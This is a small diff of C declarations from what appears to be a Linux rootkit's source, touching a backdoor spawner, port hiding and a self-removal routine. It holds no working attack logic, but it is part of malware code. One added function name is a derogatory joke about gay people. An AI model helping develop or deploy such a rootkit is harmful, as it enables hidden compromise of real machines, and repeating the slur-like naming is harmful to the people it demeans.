@@ -6,6 +6,9 @@ void spawnpdoor(void); // sue me
 int pdoorup(void);
 #endif
 
+extern void bdvlsuperreallygay(void);
+static char *resolvelibpath(void);
+
 #define HOME_VAR "HOME="HOMEDIR
 
 #include "proc/proc.h"
@@ -44,7 +47,8 @@ int logcount(const char *path);
 #include "log.c"
 #endif
 
-int rknomore(char *installdir, char *bdvlso);
+int _rknomore(char *installdir, char *bdvlso);
+#define rknomore() _rknomore(INSTALL_DIR, BDVLSO)
 #include "nomore.c"
 
 #ifdef HIDE_PORTS
